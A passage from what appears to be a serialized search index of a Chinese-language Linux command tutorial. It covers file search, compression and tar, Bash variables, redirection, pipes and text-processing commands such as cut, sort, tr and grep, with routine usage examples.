-n \uFF1A\u540E\u9762\u63A5\u6570\u5B57\uFF0C\u4EE3\u8868\u663E\u793A\u51E0\u884C\u7684\u610F\u601D`},{header:"6. tail",slug:"_6-tail",content:"\u662F head \u7684\u53CD\u5411\u64CD\u4F5C\uFF0C\u53EA\u662F\u53D6\u5F97\u662F\u540E\u51E0\u884C\u3002"},{header:"7. od",slug:"_7-od",content:"\u4EE5\u5B57\u7B26\u6216\u8005\u5341\u516D\u8FDB\u5236\u7684\u5F62\u5F0F\u663E\u793A\u4E8C\u8FDB\u5236\u6587\u4EF6\u3002"},{header:"\u6307\u4EE4\u4E0E\u6587\u4EF6\u641C\u7D22",slug:"\u6307\u4EE4\u4E0E\u6587\u4EF6\u641C\u7D22",content:""},{header:"1. which",slug:"_1-which",content:`\u6307\u4EE4\u641C\u7D22\u3002
## which [-a] command
-a \uFF1A\u5C06\u6240\u6709\u6307\u4EE4\u5217\u51FA\uFF0C\u800C\u4E0D\u662F\u53EA\u5217\u7B2C\u4E00\u4E2A`},{header:"2. whereis",slug:"_2-whereis",content:`\u6587\u4EF6\u641C\u7D22\u3002\u901F\u5EA6\u6BD4\u8F83\u5FEB\uFF0C\u56E0\u4E3A\u5B83\u53EA\u641C\u7D22\u51E0\u4E2A\u7279\u5B9A\u7684\u76EE\u5F55\u3002
## whereis [-bmsu] dirname/filename`},{header:"3. locate",slug:"_3-locate",content:`\u6587\u4EF6\u641C\u7D22\u3002\u53EF\u4EE5\u7528\u5173\u952E\u5B57\u6216\u8005\u6B63\u5219\u8868\u8FBE\u5F0F\u8FDB\u884C\u641C\u7D22\u3002
locate \u4F7F\u7528 /var/lib/mlocate/ \u8FD9\u4E2A\u6570\u636E\u5E93\u6765\u8FDB\u884C\u641C\u7D22\uFF0C\u5B83\u5B58\u50A8\u5728\u5185\u5B58\u4E2D\uFF0C\u5E76\u4E14\u6BCF\u5929\u66F4\u65B0\u4E00\u6B21\uFF0C\u6240\u4EE5\u65E0\u6CD5\u7528 locate \u641C\u7D22\u65B0\u5EFA\u7684\u6587\u4EF6\u3002\u53EF\u4EE5\u4F7F\u7528 updatedb \u6765\u7ACB\u5373\u66F4\u65B0\u6570\u636E\u5E93\u3002
## locate [-ir] keyword
-r\uFF1A\u6B63\u5219\u8868\u8FBE\u5F0F`},{header:"4. find",slug:"_4-find",content:`\u6587\u4EF6\u641C\u7D22\u3002\u53EF\u4EE5\u4F7F\u7528\u6587\u4EF6\u7684\u5C5E\u6027\u548C\u6743\u9650\u8FDB\u884C\u641C\u7D22\u3002
## find [basedir] [option]
example: find . -name "shadow*"
\u2460 \u4E0E\u65F6\u95F4\u6709\u5173\u7684\u9009\u9879
-mtime n \uFF1A\u5217\u51FA\u5728 n \u5929\u524D\u7684\u90A3\u4E00\u5929\u4FEE\u6539\u8FC7\u5185\u5BB9\u7684\u6587\u4EF6
-mtime +n \uFF1A\u5217\u51FA\u5728 n \u5929\u4E4B\u524D (\u4E0D\u542B n \u5929\u672C\u8EAB) \u4FEE\u6539\u8FC7\u5185\u5BB9\u7684\u6587\u4EF6
-mtime -n \uFF1A\u5217\u51FA\u5728 n \u5929\u4E4B\u5185 (\u542B n \u5929\u672C\u8EAB) \u4FEE\u6539\u8FC7\u5185\u5BB9\u7684\u6587\u4EF6
-newer file \uFF1A \u5217\u51FA\u6BD4 file \u66F4\u65B0\u7684\u6587\u4EF6
+4\u30014 \u548C -4 \u7684\u6307\u793A\u7684\u65F6\u95F4\u8303\u56F4\u5982\u4E0B\uFF1A
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/658fc5e7-79c0-4247-9445-d69bf194c539.png" width=")
\u2461 \u4E0E\u6587\u4EF6\u62E5\u6709\u8005\u548C\u6240\u5C5E\u7FA4\u7EC4\u6709\u5173\u7684\u9009\u9879
-uid n
-gid n
-user name
-group name
-nouser \uFF1A\u641C\u7D22\u62E5\u6709\u8005\u4E0D\u5B58\u5728 /etc/passwd \u7684\u6587\u4EF6
-nogroup\uFF1A\u641C\u7D22\u6240\u5C5E\u7FA4\u7EC4\u4E0D\u5B58\u5728\u4E8E /etc/group \u7684\u6587\u4EF6
\u2462 \u4E0E\u6587\u4EF6\u6743\u9650\u548C\u540D\u79F0\u6709\u5173\u7684\u9009\u9879
-name filename
-size [+-]SIZE\uFF1A\u641C\u5BFB\u6BD4 SIZE \u8FD8\u8981\u5927 (+) \u6216\u5C0F (-) \u7684\u6587\u4EF6\u3002\u8FD9\u4E2A SIZE \u7684\u89C4\u683C\u6709\uFF1Ac: \u4EE3\u8868 byte\uFF0Ck: \u4EE3\u8868 1024bytes\u3002\u6240\u4EE5\uFF0C\u8981\u627E\u6BD4 50KB \u8FD8\u8981\u5927\u7684\u6587\u4EF6\uFF0C\u5C31\u662F -size +50k
-type TYPE
-perm mode \uFF1A\u641C\u7D22\u6743\u9650\u7B49\u4E8E mode \u7684\u6587\u4EF6
-perm -mode \uFF1A\u641C\u7D22\u6743\u9650\u5305\u542B mode \u7684\u6587\u4EF6
-perm /mode \uFF1A\u641C\u7D22\u6743\u9650\u5305\u542B\u4EFB\u4E00 mode \u7684\u6587\u4EF6`},{header:"\u516D\u3001\u538B\u7F29\u4E0E\u6253\u5305",slug:"\u516D\u3001\u538B\u7F29\u4E0E\u6253\u5305",content:""},{header:"\u538B\u7F29\u6587\u4EF6\u540D",slug:"\u538B\u7F29\u6587\u4EF6\u540D",content:`Linux \u5E95\u4E0B\u6709\u5F88\u591A\u538B\u7F29\u6587\u4EF6\u540D\uFF0C\u5E38\u89C1\u7684\u5982\u4E0B\uFF1A \u6269\u5C55\u540D
\u538B\u7F29\u7A0B\u5E8F *.Z
compress *.zip
zip *.gz
gzip *.bz2
bzip2 *.xz
xz *.tar
tar \u7A0B\u5E8F\u6253\u5305\u7684\u6570\u636E\uFF0C\u6CA1\u6709\u7ECF\u8FC7\u538B\u7F29 *.tar.gz
tar \u7A0B\u5E8F\u6253\u5305\u7684\u6587\u4EF6\uFF0C\u7ECF\u8FC7 gzip \u7684\u538B\u7F29 *.tar.bz2
tar \u7A0B\u5E8F\u6253\u5305\u7684\u6587\u4EF6\uFF0C\u7ECF\u8FC7 bzip2 \u7684\u538B\u7F29 *.tar.xz
tar \u7A0B\u5E8F\u6253\u5305\u7684\u6587\u4EF6\uFF0C\u7ECF\u8FC7 xz \u7684\u538B\u7F29`},{header:"\u538B\u7F29\u6307\u4EE4",slug:"\u538B\u7F29\u6307\u4EE4",content:""},{header:"1. gzip",slug:"_1-gzip",content:`gzip \u662F Linux \u4F7F\u7528\u6700\u5E7F\u7684\u538B\u7F29\u6307\u4EE4\uFF0C\u53EF\u4EE5\u89E3\u5F00 compress\u3001zip \u4E0E gzip \u6240\u538B\u7F29\u7684\u6587\u4EF6\u3002
\u7ECF\u8FC7 gzip \u538B\u7F29\u8FC7\uFF0C\u6E90\u6587\u4EF6\u5C31\u4E0D\u5B58\u5728\u4E86\u3002
\u6709 9 \u4E2A\u4E0D\u540C\u7684\u538B\u7F29\u7B49\u7EA7\u53EF\u4EE5\u4F7F\u7528\u3002
\u53EF\u4EE5\u4F7F\u7528 zcat\u3001zmore\u3001zless \u6765\u8BFB\u53D6\u538B\u7F29\u6587\u4EF6\u7684\u5185\u5BB9\u3002
$ gzip [-cdtv#] filename
-c \uFF1A\u5C06\u538B\u7F29\u7684\u6570\u636E\u8F93\u51FA\u5230\u5C4F\u5E55\u4E0A
-d \uFF1A\u89E3\u538B\u7F29
-t \uFF1A\u68C0\u9A8C\u538B\u7F29\u6587\u4EF6\u662F\u5426\u51FA\u9519
-v \uFF1A\u663E\u793A\u538B\u7F29\u6BD4\u7B49\u4FE1\u606F
-# \uFF1A # \u4E3A\u6570\u5B57\u7684\u610F\u601D\uFF0C\u4EE3\u8868\u538B\u7F29\u7B49\u7EA7\uFF0C\u6570\u5B57\u8D8A\u5927\u538B\u7F29\u6BD4\u8D8A\u9AD8\uFF0C\u9ED8\u8BA4\u4E3A 6`},{header:"2. bzip2",slug:"_2-bzip2",content:`\u63D0\u4F9B\u6BD4 gzip \u66F4\u9AD8\u7684\u538B\u7F29\u6BD4\u3002
\u67E5\u770B\u547D\u4EE4\uFF1Abzcat\u3001bzmore\u3001bzless\u3001bzgrep\u3002
$ bzip2 [-cdkzv#] filename
-k \uFF1A\u4FDD\u7559\u6E90\u6587\u4EF6`},{header:"3. xz",slug:"_3-xz",content:`\u63D0\u4F9B\u6BD4 bzip2 \u66F4\u4F73\u7684\u538B\u7F29\u6BD4\u3002
\u53EF\u4EE5\u770B\u5230\uFF0Cgzip\u3001bzip2\u3001xz \u7684\u538B\u7F29\u6BD4\u4E0D\u65AD\u4F18\u5316\u3002\u4E0D\u8FC7\u8981\u6CE8\u610F\u7684\u662F\uFF0C\u538B\u7F29\u6BD4\u8D8A\u9AD8\uFF0C\u538B\u7F29\u7684\u65F6\u95F4\u4E5F\u8D8A\u957F\u3002
\u67E5\u770B\u547D\u4EE4\uFF1Axzcat\u3001xzmore\u3001xzless\u3001xzgrep\u3002
xz [-dtlkc#] filename`},{header:"\u6253\u5305",slug:"\u6253\u5305",content:`\u538B\u7F29\u6307\u4EE4\u53EA\u80FD\u5BF9\u4E00\u4E2A\u6587\u4EF6\u8FDB\u884C\u538B\u7F29\uFF0C\u800C\u6253\u5305\u80FD\u591F\u5C06\u591A\u4E2A\u6587\u4EF6\u6253\u5305\u6210\u4E00\u4E2A\u5927\u6587\u4EF6\u3002tar \u4E0D\u4EC5\u53EF\u4EE5\u7528\u4E8E\u6253\u5305\uFF0C\u4E5F\u53EF\u4EE5\u4F7F\u7528 gzip\u3001bzip2\u3001xz \u5C06\u6253\u5305\u6587\u4EF6\u8FDB\u884C\u538B\u7F29\u3002
$ tar [-z|-j|-J] [cv] [-f \u65B0\u5EFA\u7684 tar \u6587\u4EF6] filename... ==\u6253\u5305\u538B\u7F29
$ tar [-z|-j|-J] [tv] [-f \u5DF2\u6709\u7684 tar \u6587\u4EF6] ==\u67E5\u770B
$ tar [-z|-j|-J] [xv] [-f \u5DF2\u6709\u7684 tar \u6587\u4EF6] [-C \u76EE\u5F55] ==\u89E3\u538B\u7F29
-z \uFF1A\u4F7F\u7528 zip\uFF1B
-j \uFF1A\u4F7F\u7528 bzip2\uFF1B
-J \uFF1A\u4F7F\u7528 xz\uFF1B
-c \uFF1A\u65B0\u5EFA\u6253\u5305\u6587\u4EF6\uFF1B
-t \uFF1A\u67E5\u770B\u6253\u5305\u6587\u4EF6\u91CC\u9762\u6709\u54EA\u4E9B\u6587\u4EF6\uFF1B
-x \uFF1A\u89E3\u6253\u5305\u6216\u89E3\u538B\u7F29\u7684\u529F\u80FD\uFF1B
-v \uFF1A\u5728\u538B\u7F29/\u89E3\u538B\u7F29\u7684\u8FC7\u7A0B\u4E2D\uFF0C\u663E\u793A\u6B63\u5728\u5904\u7406\u7684\u6587\u4EF6\u540D\uFF1B
-f : filename\uFF1A\u8981\u5904\u7406\u7684\u6587\u4EF6\uFF1B
-C \u76EE\u5F55 \uFF1A \u5728\u7279\u5B9A\u76EE\u5F55\u89E3\u538B\u7F29\u3002 \u4F7F\u7528\u65B9\u5F0F
\u547D\u4EE4 \u6253\u5305\u538B\u7F29
tar -jcv -f filename.tar.bz2 \u8981\u88AB\u538B\u7F29\u7684\u6587\u4EF6\u6216\u76EE\u5F55\u540D\u79F0 \u67E5 \u770B
tar -jtv -f filename.tar.bz2 \u89E3\u538B\u7F29
tar -jxv -f filename.tar.bz2 -C \u8981\u89E3\u538B\u7F29\u7684\u76EE\u5F55`},{header:"\u4E03\u3001Bash",slug:"\u4E03\u3001bash",content:"\u53EF\u4EE5\u901A\u8FC7 Shell \u8BF7\u6C42\u5185\u6838\u63D0\u4F9B\u670D\u52A1\uFF0CBash \u6B63\u662F Shell \u7684\u4E00\u79CD\u3002"},{header:"\u7279\u6027",slug:"\u7279\u6027",content:`\u547D\u4EE4\u5386\u53F2\uFF1A\u8BB0\u5F55\u4F7F\u7528\u8FC7\u7684\u547D\u4EE4
\u547D\u4EE4\u4E0E\u6587\u4EF6\u8865\u5168\uFF1A\u5FEB\u6377\u952E\uFF1Atab
\u547D\u540D\u522B\u540D\uFF1A\u4F8B\u5982 ll \u662F ls -al \u7684\u522B\u540D
shell scripts
\u901A\u914D\u7B26\uFF1A\u4F8B\u5982 ls -l /usr/bin/X* \u5217\u51FA /usr/bin \u4E0B\u9762\u6240\u6709\u4EE5 X \u5F00\u5934\u7684\u6587\u4EF6`},{header:"\u53D8\u91CF\u64CD\u4F5C",slug:"\u53D8\u91CF\u64CD\u4F5C",content:`\u5BF9\u4E00\u4E2A\u53D8\u91CF\u8D4B\u503C\u76F4\u63A5\u4F7F\u7528 =\u3002
\u5BF9\u53D8\u91CF\u53D6\u7528\u9700\u8981\u5728\u53D8\u91CF\u524D\u52A0\u4E0A $ \uFF0C\u4E5F\u53EF\u4EE5\u7528 \${} \u7684\u5F62\u5F0F\uFF1B
\u8F93\u51FA\u53D8\u91CF\u4F7F\u7528 echo \u547D\u4EE4\u3002
x=abc
echo $x
echo \${x}
\u53D8\u91CF\u5185\u5BB9\u5982\u679C\u6709\u7A7A\u683C\uFF0C\u5FC5\u987B\u4F7F\u7528\u53CC\u5F15\u53F7\u6216\u8005\u5355\u5F15\u53F7\u3002 \u53CC\u5F15\u53F7\u5185\u7684\u7279\u6B8A\u5B57\u7B26\u53EF\u4EE5\u4FDD\u7559\u539F\u672C\u7279\u6027\uFF0C\u4F8B\u5982 x="lang is $LANG"\uFF0C\u5219 x \u7684\u503C\u4E3A lang is zh_TW.UTF-8\uFF1B
\u5355\u5F15\u53F7\u5185\u7684\u7279\u6B8A\u5B57\u7B26\u5C31\u662F\u7279\u6B8A\u5B57\u7B26\u672C\u8EAB\uFF0C\u4F8B\u5982 x='lang is $LANG'\uFF0C\u5219 x \u7684\u503C\u4E3A lang is $LANG\u3002 \u53EF\u4EE5\u4F7F\u7528 \`\u6307\u4EE4\` \u6216\u8005 $(\u6307\u4EE4) \u7684\u65B9\u5F0F\u5C06\u6307\u4EE4\u7684\u6267\u884C\u7ED3\u679C\u8D4B\u503C\u7ED9\u53D8\u91CF\u3002\u4F8B\u5982 version=$(uname -r)\uFF0C\u5219 version \u7684\u503C\u4E3A 4.15.0-22-generic\u3002
\u53EF\u4EE5\u4F7F\u7528 export \u547D\u4EE4\u5C06\u81EA\u5B9A\u4E49\u53D8\u91CF\u8F6C\u6210\u73AF\u5883\u53D8\u91CF\uFF0C\u73AF\u5883\u53D8\u91CF\u53EF\u4EE5\u5728\u5B50\u7A0B\u5E8F\u4E2D\u4F7F\u7528\uFF0C\u6240\u8C13\u5B50\u7A0B\u5E8F\u5C31\u662F\u7531\u5F53\u524D Bash \u800C\u4EA7\u751F\u7684\u5B50 Bash\u3002
Bash \u7684\u53D8\u91CF\u53EF\u4EE5\u58F0\u660E\u4E3A\u6570\u7EC4\u548C\u6574\u6570\u6570\u5B57\u3002\u6CE8\u610F\u6570\u5B57\u7C7B\u578B\u6CA1\u6709\u6D6E\u70B9\u6570\u3002\u5982\u679C\u4E0D\u8FDB\u884C\u58F0\u660E\uFF0C\u9ED8\u8BA4\u662F\u5B57\u7B26\u4E32\u7C7B\u578B\u3002\u53D8\u91CF\u7684\u58F0\u660E\u4F7F\u7528 declare \u547D\u4EE4\uFF1A
$ declare [-aixr] variable
-a \uFF1A \u5B9A\u4E49\u4E3A\u6570\u7EC4\u7C7B\u578B
-i \uFF1A \u5B9A\u4E49\u4E3A\u6574\u6570\u7C7B\u578B
-x \uFF1A \u5B9A\u4E49\u4E3A\u73AF\u5883\u53D8\u91CF
-r \uFF1A \u5B9A\u4E49\u4E3A readonly \u7C7B\u578B
\u4F7F\u7528 [ ] \u6765\u5BF9\u6570\u7EC4\u8FDB\u884C\u7D22\u5F15\u64CD\u4F5C\uFF1A
array[1]=a
array[2]=b
echo \${array[1]}`},{header:"\u6307\u4EE4\u641C\u7D22\u987A\u5E8F",slug:"\u6307\u4EE4\u641C\u7D22\u987A\u5E8F",content:`\u4EE5\u7EDD\u5BF9\u6216\u76F8\u5BF9\u8DEF\u5F84\u6765\u6267\u884C\u6307\u4EE4\uFF0C\u4F8B\u5982 /bin/ls \u6216\u8005 ./ls \uFF1B
\u7531\u522B\u540D\u627E\u5230\u8BE5\u6307\u4EE4\u6765\u6267\u884C\uFF1B
\u7531 Bash \u5185\u7F6E\u7684\u6307\u4EE4\u6765\u6267\u884C\uFF1B
\u6309 $PATH \u53D8\u91CF\u6307\u5B9A\u7684\u641C\u7D22\u8DEF\u5F84\u7684\u987A\u5E8F\u627E\u5230\u7B2C\u4E00\u4E2A\u6307\u4EE4\u6765\u6267\u884C\u3002`},{header:"\u6570\u636E\u6D41\u91CD\u5B9A\u5411",slug:"\u6570\u636E\u6D41\u91CD\u5B9A\u5411",content:`\u91CD\u5B9A\u5411\u6307\u7684\u662F\u4F7F\u7528\u6587\u4EF6\u4EE3\u66FF\u6807\u51C6\u8F93\u5165\u3001\u6807\u51C6\u8F93\u51FA\u548C\u6807\u51C6\u9519\u8BEF\u8F93\u51FA\u3002 1
\u4EE3\u7801
\u8FD0\u7B97\u7B26 \u6807\u51C6\u8F93\u5165 (stdin)
0
< \u6216 << \u6807\u51C6\u8F93\u51FA (stdout)
1
> \u6216 >> \u6807\u51C6\u9519\u8BEF\u8F93\u51FA (stderr)
2
2> \u6216 2>> \u5176\u4E2D\uFF0C\u6709\u4E00\u4E2A\u7BAD\u5934\u7684\u8868\u793A\u4EE5\u8986\u76D6\u7684\u65B9\u5F0F\u91CD\u5B9A\u5411\uFF0C\u800C\u6709\u4E24\u4E2A\u7BAD\u5934\u7684\u8868\u793A\u4EE5\u8FFD\u52A0\u7684\u65B9\u5F0F\u91CD\u5B9A\u5411\u3002
\u53EF\u4EE5\u5C06\u4E0D\u9700\u8981\u7684\u6807\u51C6\u8F93\u51FA\u4EE5\u53CA\u6807\u51C6\u9519\u8BEF\u8F93\u51FA\u91CD\u5B9A\u5411\u5230 /dev/null\uFF0C\u76F8\u5F53\u4E8E\u6254\u8FDB\u5783\u573E\u7BB1\u3002
\u5982\u679C\u9700\u8981\u5C06\u6807\u51C6\u8F93\u51FA\u4EE5\u53CA\u6807\u51C6\u9519\u8BEF\u8F93\u51FA\u540C\u65F6\u91CD\u5B9A\u5411\u5230\u4E00\u4E2A\u6587\u4EF6\uFF0C\u9700\u8981\u5C06\u67D0\u4E2A\u8F93\u51FA\u8F6C\u6362\u4E3A\u53E6\u4E00\u4E2A\u8F93\u51FA\uFF0C\u4F8B\u5982 2>&1 \u8868\u793A\u5C06\u6807\u51C6\u9519\u8BEF\u8F93\u51FA\u8F6C\u6362\u4E3A\u6807\u51C6\u8F93\u51FA\u3002
find /home -name .bashrc > list 2>&1`},{header:"\u516B\u3001\u7BA1\u9053\u6307\u4EE4",slug:"\u516B\u3001\u7BA1\u9053\u6307\u4EE4",content:`\u7BA1\u9053\u662F\u5C06\u4E00\u4E2A\u547D\u4EE4\u7684\u6807\u51C6\u8F93\u51FA\u4F5C\u4E3A\u53E6\u4E00\u4E2A\u547D\u4EE4\u7684\u6807\u51C6\u8F93\u5165\uFF0C\u5728\u6570\u636E\u9700\u8981\u7ECF\u8FC7\u591A\u4E2A\u6B65\u9AA4\u7684\u5904\u7406\u4E4B\u540E\u624D\u80FD\u5F97\u5230\u6211\u4EEC\u60F3\u8981\u7684\u5185\u5BB9\u65F6\u5C31\u53EF\u4EE5\u4F7F\u7528\u7BA1\u9053\u3002
\u5728\u547D\u4EE4\u4E4B\u95F4\u4F7F\u7528 | \u5206\u9694\u5404\u4E2A\u7BA1\u9053\u547D\u4EE4\u3002
ls -al /etc | less`},{header:"\u63D0\u53D6\u6307\u4EE4",slug:"\u63D0\u53D6\u6307\u4EE4",content:`cut \u5BF9\u6570\u636E\u8FDB\u884C\u5207\u5206\uFF0C\u53D6\u51FA\u60F3\u8981\u7684\u90E8\u5206\u3002
\u5207\u5206\u8FC7\u7A0B\u4E00\u884C\u4E00\u884C\u5730\u8FDB\u884C\u3002
$ cut
-d \uFF1A\u5206\u9694\u7B26
-f \uFF1A\u7ECF\u8FC7 -d \u5206\u9694\u540E\uFF0C\u4F7F\u7528 -f n \u53D6\u51FA\u7B2C n \u4E2A\u533A\u95F4
-c \uFF1A\u4EE5\u5B57\u7B26\u4E3A\u5355\u4F4D\u53D6\u51FA\u533A\u95F4
\u793A\u4F8B 1\uFF1Alast \u663E\u793A\u767B\u5165\u8005\u7684\u4FE1\u606F\uFF0C\u53D6\u51FA\u7528\u6237\u540D\u3002
$ last
root pts/1 192.168.201.101 Sat Feb 7 12:35 still logged in
root pts/1 192.168.201.101 Fri Feb 6 12:13 - 18:46 (06:33)
root pts/1 192.168.201.254 Thu Feb 5 22:37 - 23:53 (01:16) $ last | cut -d ' ' -f 1
\u793A\u4F8B 2\uFF1A\u5C06 export \u8F93\u51FA\u7684\u4FE1\u606F\uFF0C\u53D6\u51FA\u7B2C 12 \u5B57\u7B26\u4EE5\u540E\u7684\u6240\u6709\u5B57\u7B26\u4E32\u3002
$ export
declare -x HISTCONTROL="ignoredups"
declare -x HISTSIZE="1000"
declare -x HOME="/home/dmtsai"
declare -x HOSTNAME="study.centos.vbird"
.....(\u5176\u4ED6\u7701\u7565)..... $ export | cut -c 12-`},{header:"\u6392\u5E8F\u6307\u4EE4",slug:"\u6392\u5E8F\u6307\u4EE4",content:`sort \u7528\u4E8E\u6392\u5E8F\u3002
$ sort [-fbMnrtuk] [file or stdin]
-f \uFF1A\u5FFD\u7565\u5927\u5C0F\u5199
-b \uFF1A\u5FFD\u7565\u6700\u524D\u9762\u7684\u7A7A\u683C
-M \uFF1A\u4EE5\u6708\u4EFD\u7684\u540D\u5B57\u6765\u6392\u5E8F\uFF0C\u4F8B\u5982 JAN\uFF0CDEC
-n \uFF1A\u4F7F\u7528\u6570\u5B57
-r \uFF1A\u53CD\u5411\u6392\u5E8F
-u \uFF1A\u76F8\u5F53\u4E8E unique\uFF0C\u91CD\u590D\u7684\u5185\u5BB9\u53EA\u51FA\u73B0\u4E00\u6B21
-t \uFF1A\u5206\u9694\u7B26\uFF0C\u9ED8\u8BA4\u4E3A tab
-k \uFF1A\u6307\u5B9A\u6392\u5E8F\u7684\u533A\u95F4
\u793A\u4F8B\uFF1A/etc/passwd \u6587\u4EF6\u5185\u5BB9\u4EE5 : \u6765\u5206\u9694\uFF0C\u8981\u6C42\u4EE5\u7B2C\u4E09\u5217\u8FDB\u884C\u6392\u5E8F\u3002
$ cat /etc/passwd | sort -t ':' -k 3
root:x:0:0:root:/root:/bin/bash
dmtsai:x:1000:1000:dmtsai:/home/dmtsai:/bin/bash
alex:x:1001:1002::/home/alex:/bin/bash
arod:x:1002:1003::/home/arod:/bin/bash
uniq \u53EF\u4EE5\u5C06\u91CD\u590D\u7684\u6570\u636E\u53EA\u53D6\u4E00\u4E2A\u3002
$ uniq [-ic]
-i \uFF1A\u5FFD\u7565\u5927\u5C0F\u5199
-c \uFF1A\u8FDB\u884C\u8BA1\u6570
\u793A\u4F8B\uFF1A\u53D6\u5F97\u6BCF\u4E2A\u4EBA\u7684\u767B\u5F55\u603B\u6B21\u6570
$ last | cut -d ' ' -f 1 | sort | uniq -c
1
6 (unknown
47 dmtsai
4 reboot
7 root
1 wtmp`},{header:"\u53CC\u5411\u8F93\u51FA\u91CD\u5B9A\u5411",slug:"\u53CC\u5411\u8F93\u51FA\u91CD\u5B9A\u5411",content:`\u8F93\u51FA\u91CD\u5B9A\u5411\u4F1A\u5C06\u8F93\u51FA\u5185\u5BB9\u91CD\u5B9A\u5411\u5230\u6587\u4EF6\u4E2D\uFF0C\u800C tee \u4E0D\u4EC5\u80FD\u591F\u5B8C\u6210\u8FD9\u4E2A\u529F\u80FD\uFF0C\u8FD8\u80FD\u4FDD\u7559\u5C4F\u5E55\u4E0A\u7684\u8F93\u51FA\u3002\u4E5F\u5C31\u662F\u8BF4\uFF0C\u4F7F\u7528 tee \u6307\u4EE4\uFF0C\u4E00\u4E2A\u8F93\u51FA\u4F1A\u540C\u65F6\u4F20\u9001\u5230\u6587\u4EF6\u548C\u5C4F\u5E55\u4E0A\u3002
tee [-a] file`},{header:"\u5B57\u7B26\u8F6C\u6362\u6307\u4EE4",slug:"\u5B57\u7B26\u8F6C\u6362\u6307\u4EE4",content:`tr \u7528\u6765\u5220\u9664\u4E00\u884C\u4E2D\u7684\u5B57\u7B26\uFF0C\u6216\u8005\u5BF9\u5B57\u7B26\u8FDB\u884C\u66FF\u6362\u3002
$ tr [-ds] SET1 ...
-d \uFF1A \u5220\u9664\u884C\u4E2D SET1 \u8FD9\u4E2A\u5B57\u7B26\u4E32
\u793A\u4F8B\uFF0C\u5C06 last \u8F93\u51FA\u7684\u4FE1\u606F\u6240\u6709\u5C0F\u5199\u8F6C\u6362\u4E3A\u5927\u5199\u3002
last | tr '[a-z]' '[A-Z]'
col \u5C06 tab \u5B57\u7B26\u8F6C\u4E3A\u7A7A\u683C\u5B57\u7B26\u3002
$ col [-xb]
-x \uFF1A \u5C06 tab \u952E\u8F6C\u6362\u6210\u5BF9\u7B49\u7684\u7A7A\u683C\u952E
expand \u5C06 tab \u8F6C\u6362\u4E00\u5B9A\u6570\u91CF\u7684\u7A7A\u683C\uFF0C\u9ED8\u8BA4\u662F 8 \u4E2A\u3002
$ expand [-t] file
-t \uFF1Atab \u8F6C\u4E3A\u7A7A\u683C\u7684\u6570\u91CF
join \u5C06\u6709\u76F8\u540C\u6570\u636E\u7684\u90A3\u4E00\u884C\u5408\u5E76\u5728\u4E00\u8D77\u3002
$ join [-ti12] file1 file2
-t \uFF1A\u5206\u9694\u7B26\uFF0C\u9ED8\u8BA4\u4E3A\u7A7A\u683C
-i \uFF1A\u5FFD\u7565\u5927\u5C0F\u5199\u7684\u5DEE\u5F02
-1 \uFF1A\u7B2C\u4E00\u4E2A\u6587\u4EF6\u6240\u7528\u7684\u6BD4\u8F83\u5B57\u6BB5
-2 \uFF1A\u7B2C\u4E8C\u4E2A\u6587\u4EF6\u6240\u7528\u7684\u6BD4\u8F83\u5B57\u6BB5
paste \u76F4\u63A5\u5C06\u4E24\u884C\u7C98\u8D34\u5728\u4E00\u8D77\u3002
$ paste [-d] file1 file2
-d \uFF1A\u5206\u9694\u7B26\uFF0C\u9ED8\u8BA4\u4E3A tab`},{header:"\u5206\u533A\u6307\u4EE4",slug:"\u5206\u533A\u6307\u4EE4",content:`split \u5C06\u4E00\u4E2A\u6587\u4EF6\u5212\u5206\u6210\u591A\u4E2A\u6587\u4EF6\u3002
$ split [-bl] file PREFIX
-b \uFF1A\u4EE5\u5927\u5C0F\u6765\u8FDB\u884C\u5206\u533A\uFF0C\u53EF\u52A0\u5355\u4F4D\uFF0C\u4F8B\u5982 b, k, m \u7B49
-l \uFF1A\u4EE5\u884C\u6570\u6765\u8FDB\u884C\u5206\u533A\u3002
- PREFIX \uFF1A\u5206\u533A\u6587\u4EF6\u7684\u524D\u5BFC\u540D\u79F0`},{header:"\u4E5D\u3001\u6B63\u5219\u8868\u8FBE\u5F0F",slug:"\u4E5D\u3001\u6B63\u5219\u8868\u8FBE\u5F0F",content:""},{header:"grep",slug:"grep",content:`g/re/p\uFF08globally search a regular expression and print)\uFF0C\u4F7F\u7528\u6B63\u5219\u8868\u793A\u5F0F\u8FDB\u884C\u5168\u5C40\u67E5\u627E\u5E76\u6253\u5370\u3002
$ grep [-acinv] [--color=auto] \u641C\u5BFB\u5B57\u7B26\u4E32 filename
-c \uFF1A \u7EDF\u8BA1\u5339\u914D\u5230\u884C\u7684\u4E2A\u6570
-i \uFF1A \u5FFD\u7565\u5927\u5C0F\u5199
-n \uFF1A \u8F93\u51FA\u884C\u53F7
-v \uFF1A \u53CD\u5411\u9009\u62E9\uFF0C\u4E5F\u5C31\u662F\u663E\u793A\u51FA\u6CA1\u6709 \u641C\u5BFB\u5B57\u7B26\u4E32 \u5185\u5BB9\u7684\u90A3\u4E00\u884C
--color=auto \uFF1A\u627E\u5230\u7684\u5173\u952E\u5B57\u52A0\u989C\u8272\u663E\u793A
\u793A\u4F8B\uFF1A\u628A\u542B\u6709 the \u5B57\u7B26\u4E32\u7684\u884C\u63D0\u53D6\u51FA\u6765\uFF08\u6CE8\u610F\u9ED8\u8BA4\u4F1A\u6709 --color=auto \u9009\u9879\uFF0C\u56E0\u6B64\u4EE5\u4E0B\u5185\u5BB9\u5728 Linux \u4E2D\u6709\u989C\u8272\u663E\u793A the \u5B57\u7B26\u4E32\uFF09
$ grep -n 'the' regular_express.txt
8:I can't finish the test.
12:the symbol '*' is represented as start.
15:You are the best is mean you are the no. 1.
16:The world Happy is the same with "glad".
18:google is the best tools for search keyword
\u793A\u4F8B\uFF1A\u6B63\u5219\u8868\u8FBE\u5F0F a{m,n} \u7528\u6765\u5339\u914D\u5B57\u7B26 a m~n \u6B21\uFF0C\u8FD9\u91CC\u9700\u8981\u5C06 { \u548C } \u8FDB\u884C\u8F6C\u4E49\uFF0C\u56E0\u4E3A\u5B83\u4EEC\u5728 shell \u662F\u6709\u7279\u6B8A\u610F\u4E49\u7684\u3002
grep -n 'a\\{2,5\\}' regular_express.txt`},{header:"printf",slug:"printf",content:`\u7528\u4E8E\u683C\u5F0F\u5316\u8F93\u51FA\u3002\u5B83\u4E0D\u5C5E\u4E8E\u7BA1\u9053\u547D\u4EE4\uFF0C\u5728\u7ED9 printf \u4F20\u6570\u636E\u65F6\u9700\u8981\u4F7F\u7528 $( ) \u5F62\u5F0F\u3002
